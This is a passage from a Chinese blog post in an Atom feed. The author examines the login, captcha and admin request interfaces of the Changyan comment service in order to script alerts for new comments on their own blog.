class="line">rememberMe:true</span><br><span class="line">password:1111111</span><br><span class="line">vcode:1882</span><br><span class="line">vipIsvId:0</span><br><span class="line">_:1502508368658</span><br><span class="line"></span><br><span class="line">//响应</span><br><span class="line">jQuery17101803876020131434_1502867163749(&#123;&quot;data&quot;:&#123;&#125;,&quot;code&quot;:0,&quot;msg&quot;:&quot;success&quot;&#125;); //发送了callback</span><br><span class="line">&#123;&quot;data&quot;:&#123;&#125;,&quot;code&quot;:0,&quot;msg&quot;:&quot;success&quot;&#125;; //没有发送callback</span><br><span class="line"></span><br><span class="line">//其他状态</span><br><span class="line">&#123;&quot;code&quot;:2,&quot;msg&quot;:&quot;验证码错误&quot;&#125;; </span><br><span class="line">&#123;&quot;code&quot;:2,&quot;msg&quot;:&quot;用户名或密码错误!&quot;&#125;</span><br></pre></td></tr></table></figure> <p>很清晰，使用GET，ajax发送数据，主要发送name, password, vcode等数据，经验证callback是可以不需要的，如果发送callback，返回数据会包一层 <code>jQuery17101803876020131434_1502867163749(data)</code>, 如果没有callback，直接返回data。</p> <p>很幸运的是，password没有做任何处理（貌似未强制https，那密码不是明文了…差评！）。没做处理，我倒简单了，不用做多余分析了，登录接口基本就这样。</p> <p>然后是返回数据，是json数据，成功code是0，错误code是2，然后是具体错误msg。不细说。</p> <h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><p>每次登录都需要验证码，挺烦的。为了自动登录，还得拿到验证码。</p> <p>获取验证码接口如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Request URL:http://changyan.kuaizhan.com/verifyCode?_1502508320545</span><br><span class="line">Request Method:GET</span><br><span class="line"></span><br><span class="line">Content-Type:image/jpeg; charset=UTF-8</span><br></pre></td></tr></table></figure> <p>返回一张jpg图片，验证码处理比较简单，应该可以用tesseract-ocr识别，没有验证。</p> <p><img src="/img/changyan1.png" alt="img"></p> <h2 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h2><p>登录成功后，进入后台。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Request URL:http://changyan.kuaizhan.com/overview</span><br><span class="line">Request Method:GET</span><br><span class="line">Status Code:200 OK</span><br></pre></td></tr></table></figure> <p><img src="/img/changyan2.png" alt="img"></p> <p>返回整个后台页面，通过页面元素找到评论位置，html代码如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;li class=&quot;right-sub-li &quot;&gt;&lt;a href=&quot;/audit/comments/TOAUDIT/1&quot; style=&quot;text-indent:25px;&quot;&gt;</span><br><span class="line">    &lt;span class=&quot;audit-number&quot;&gt;2&lt;/span&gt;</span><br><span class="line">    &lt;span style=&quot;text-indent:0px;&quot;&gt;本站评论审核&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure> <p>通过<code>r&#39;&lt;span class=&quot;audit-number&quot;&gt;(\d+?)&lt;/span&gt;&#39;</code>正则可以获取到待审核评论数，也就是新增评论，要的就是这个。</p> <h2 id="评论统计接口"><a href="#评论统计接口" class="headerlink" title="评论统计接口"></a>评论统计接口</h2><p>获取评论信息接口，使用的是ajax访问（我这用不上，顺便分析下）。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Request URL:http://changyan.kuaizhan.com/stat-data/comment</span><br><span class="line">Request Method:POST</span><br><span class="line">Status Code:200 OK</span><br><span class="line"></span><br><span class="line">Host:changyan.kuaizhan.com</span><br><span class="line">Origin:http://changyan.kuaizhan.com</span><br><span class="line">Referer:http://changyan.kuaizhan.com/overview</span><br><span class="line">User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36</span><br><span class="line">X-Requested-With:XMLHttpRequest</span><br><span class="line"></span><br><span class="line">start:20170805</span><br><span class="line">end:20170811</span><br><span class="line">categoryId:0</span><br><span class="line"></span><br><span class="line">//响应</span><br><span class="line">&#123;&quot;sdk_user_data&quot;:&#123;&#125;,&quot;user_data&quot;:&#123;&quot;20170810&quot;:1&#125;,&quot;sdk_cmt_data&quot;:&#123;&#125;,&quot;wap_cmt_data&quot;:&#123;&#125;,&quot;total_data&quot;:&#123;&quot;20170810&quot;:1,&quot;20170811&quot;:0&#125;,&quot;recommender_data&quot;:&#123;&#125;,&quot;wap_user_data&quot;:&#123;&#125;,&quot;cmt_data&quot;:&#123;&quot;20170810&quot;:1&#125;,&quot;wap_reply_data&quot;:&#123;&#125;,&quot;flood_data&quot;:&#123;&quot;20170810&quot;:0,&quot;20170811&quot;:0&#125;,&quot;sdk_reply_data&quot;:&#123;&#125;,&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure> <p>接口使用ajax POST，发送参数可以选择时间区间。</p> <p>返回数据为json，具体意义如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cmt_data : &#123;20170810: 1&#125; //评论数据1条</span><br><span class="line">flood_data : &#123;20170810: 0, 20170811: 0, 20170812: 0, 20170813: 0, 20170814: 0, 20170815: 0&#125; //每天flooddata多少条</span><br><span class="line">recommender_data : &#123;&#125;</span><br><span class="line">sdk_cmt_data : &#123;&#125;</span><br><span class="line">sdk_reply_data : &#123;&#125;</span><br><span class="line">sdk_user_data : &#123;&#125;</span><br><span class="line">success : true //获取评论信息成功</span><br><span class="line">total_data : &#123;20170810: 1, 20170811: 0, 20170812: 0, 20170813: 0, 20170814: 0, 20170815: 0&#125; // 所有评论数据</span><br><span class="line">user_data : &#123;20170810: 1&#125; //用户数据1条</span><br><span class="line">wap_cmt_data : &#123;&#125; //手机评论数据</span><br><span class="line">wap_reply_data : &#123;&#125;</span><br><span class="line">wap_user_data : &#123;&#125;</span><br></pre></td></tr></table></figure> <p>对应页面如下：</p> <p><img src="/img/changyan3.png" alt="img"></p> <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>畅言登录简单，密码未做处理，安全性有待提高。</p> <p>接口不统一，评论数据需要正则匹配。</p> <p>不过为了实现自己的小功能，还是挺简单的！</p> <p>接口分析完，通过py实现以下接口。自动登录（不识别验证码，需要手动输入），然后每间隔30分钟访问一下后台页面，获取新的评论信息，如果有新的待评审数据，声音或弹窗提醒。</p> <p>完毕！</p> <p>转载请注明出处，博客原文：<a href="https://anhkgg.github.io/pylogin-changyan-login-analyze/">https://anhkgg.github.io/pylogin-changyan-login-analyze/</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;博客使用了畅言做评论系统（多说、网易云跟帖tmd相继挂了…）。&lt;br&gt;畅言后台可以看出功能非常强大，居然还有广告业务…&lt;br&gt;but，畅言登录之后，即使你选择了记住登录，也会在每次关闭浏览器后需要重新登录，很累好伐！&lt;/p&gt; &lt;p&gt;折腾了我几天之后，决定还是决定分析一下登录协议，以及简单后台操作接口，然后写个脚本跑着吧，有新评论就给我”叮”一下，就不用我常常登录去翻了！&lt;/p&gt;          </summary>            <category term="crawler" scheme="https://anhkgg.github.io/categories/crawler/"/>                 <category term="crawler" scheme="https://anhkgg.github.io/tags/crawler/"/>            <category term="python" scheme="https://anhkgg.github.io/tags/python/"/>            <category term="js" scheme="https://anhkgg.github.io/tags/js/"/>            <category term="javascript" scheme="https://anhkgg.github.io/tags/javascript/"/>            <category term="畅言" scheme="https://anhkgg.github.io/tags/%E7%95%85%E8%A8%80/"/>        </entry>    </feed> 